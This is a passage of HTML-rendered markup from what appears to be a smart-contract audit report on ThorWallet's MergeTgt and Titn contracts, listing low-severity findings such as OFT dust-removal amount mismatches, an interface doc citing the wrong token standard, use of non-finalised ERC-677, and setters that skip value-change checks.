class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTITN_ARB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e173_700_000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ** \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTITN_ARB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eInvalidAmountReceived\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eDue to OFT’s dust removal, bridged amounts may be slightly less than expected, causing transaction failures or minor token losses.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-3\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-3\" aria-label=\"recommended mitigation steps 3 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eAdd tolerance for deposit amounts.\u003c/p\u003e\n\u003ch2 id=\"qa-02-interface-documentation-references-wrong-token-standard\" style=\"position:relative;\"\u003e\u003ca href=\"#qa-02-interface-documentation-references-wrong-token-standard\" aria-label=\"qa 02 interface documentation references wrong token standard permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[QA-02] Interface Documentation References Wrong Token Standard\u003c/h2\u003e\n\u003ch3 id=\"finding-description-and-impact-3\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact-3\" aria-label=\"finding description and impact 3 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003eIERC677Receiver\u003c/code\u003e interface documentation incorrectly references \u003ccode\u003eERC1363\u003c/code\u003e instead of \u003ccode\u003eERC677\u003c/code\u003e. This mismatch between the interface name and its documentation could lead to integration issues and developer confusion.\u003c/p\u003e\n\u003cp\u003eThe interface is named \u003ccode\u003eIERC677Receiver\u003c/code\u003e but its documentation comments reference \u003ccode\u003eERC1363\u003c/code\u003e’s \u003ccode\u003etransferAndCall\u003c/code\u003e functionality. While both standards have similar purposes, they have different implementations and requirements. This inconsistency could cause:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIntegration errors if developers implement the wrong standard based on the documentation\u003c/li\u003e\n\u003cli\u003eConfusion during code review and maintenance\u003c/li\u003e\n\u003cli\u003ePotential compatibility issues with other contracts expecting specific standard implementations\nThe impact is low, as this is primarily a documentation issue and does not affect the actual functionality of the code.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"proof-of-concept-3\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-3\" aria-label=\"proof of concept 3 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eThe interface in \u003ca href=\"https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/interfaces/IERC677Receiver.sol#L5-L6\"\u003eIERC677Receiver.sol\u003c/a\u003e:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"16\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e/**\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e@title\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e IERC1363Receiver\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e@dev\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e Interface for any contract that wants to support \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`transferAndCall`\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e or \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`transferFromAndCall`\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e from ERC-1363 token contracts.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e */\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003einterface\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eIERC677Receiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonTokenTransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe interface is used in \u003ccode\u003eMergeTgt.sol\u003c/code\u003e for handling token transfers, but it’s implementing ERC677 functionality despite the ERC1363 documentation:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"17\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIERC677Receiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;./interfaces/IERC677Receiver.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003econtract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIMerge\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eOwnable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eReentrancyGuard\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// ...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonTokenTransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eextraData\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003enonReentrant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// ...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"recommended-mitigation-steps-4\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-4\" aria-label=\"recommended mitigation steps 4 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eUpdate the interface documentation to correctly reference ERC677.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"qa-03-use-of-non-standard-erc-677-token-interface\" style=\"position:relative;\"\u003e\u003ca href=\"#qa-03-use-of-non-standard-erc-677-token-interface\" aria-label=\"qa 03 use of non standard erc 677 token interface permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[QA-03] Use of Non-Standard ERC-677 Token Interface\u003c/h2\u003e\n\u003ch3 id=\"finding-description-and-impact-4\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact-4\" aria-label=\"finding description and impact 4 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding Description and Impact\u003c/h3\u003e\n\u003cp\u003eThe protocol implements the ERC-677 token standard, which is not an officially finalized ERC standard. This introduces several risks:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eThe standard could change or be deprecated since it’s not finalized\u003c/li\u003e\n\u003cli\u003eLimited tooling and library support due to non-standardization\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"proof-of-concept-4\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-4\" aria-label=\"proof of concept 4 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eThe protocol implements \u003ca href=\"https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/interfaces/IERC677Receiver.sol#L8-L9\"\u003e\u003ccode\u003eIERC677Receiver\u003c/code\u003e\u003c/a\u003e interface:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"18\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// In IERC677Receiver.sol\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003einterface\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eIERC677Receiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonTokenTransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003eThis interface is used in \u003ca href=\"https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/MergeTgt.sol#L64-L65\"\u003e\u003ccode\u003eMergeTgt.sol\u003c/code\u003e\u003c/a\u003e.\u003c/li\u003e\n\u003cli\u003eERC-677 is not listed in the final or last call standards on \u003ca href=\"https://eips.ethereum.org/erc\"\u003ehttps://eips.ethereum.org/erc\u003c/a\u003e.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"recommended-mitigation-steps-5\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-5\" aria-label=\"recommended mitigation steps 5 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eConsider migrating to the more standardized EIP-1363 (ERC-1363), which provides similar functionality but is better specified and maintained.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"qa-04-setter-functions-dont-check-for-value-changes\" style=\"position:relative;\"\u003e\u003ca href=\"#qa-04-setter-functions-dont-check-for-value-changes\" aria-label=\"qa 04 setter functions dont check for value changes permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[QA-04] Setter Functions Don’t Check for Value Changes\u003c/h2\u003e\n\u003cp\u003eThis issue results in unnecessary event emissions when setting values that are already at the desired value.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-5\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-5\" aria-label=\"proof of concept 5 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eThe following setter functions do not check if the new value differs from the current value:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/MergeTgt.sol#L167-L168\"\u003esetLockedStatus\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/MergeTgt.sol#L172-L173\"\u003esetLaunchTime\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/Titn.sol#L33-L34\"\u003esetTransferAllowedContract\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/Titn.sol#L43-L44\"\u003esetBridgedTokenTransferLocked\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recommended-mitigation-steps-6\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-6\" aria-label=\"recommended mitigation steps 6 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eAdd checks to compare new values with current values before performing the update and emitting 